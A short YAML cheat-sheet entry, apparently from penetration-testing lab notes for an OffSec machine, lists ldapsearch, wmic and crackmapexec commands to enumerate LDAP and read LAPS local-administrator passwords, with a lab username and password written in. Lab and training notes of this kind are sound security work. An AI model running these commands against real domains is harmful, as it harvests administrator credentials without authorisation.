---
functions:
  enumeration:
    - description: Enumerate LDAP
      code: |
        ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.165.122"
        ldapsearch -D "cn=binduser,ou=users,dc=domain,dc=htb" -w "password" -b "dc=domain,dc=htb" -H ldap://127.0.0.1

    - description: Grab Local Administrator Password Solution (LAPS)
      code: |
        wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /V "Windows"
          --> Local Administrator Password Solution                  Microsoft Corporation  6.2.0.0
        ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.165.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
        
        crackmapexec ldap 192.168.165.122 -u fmcsorley -p CrabSharkJellyfish192 –kdcHost 192.168.165.122 -M laps
resources: |
  https://book.hacktricks.xyz/pentesting/pentesting-ldap
---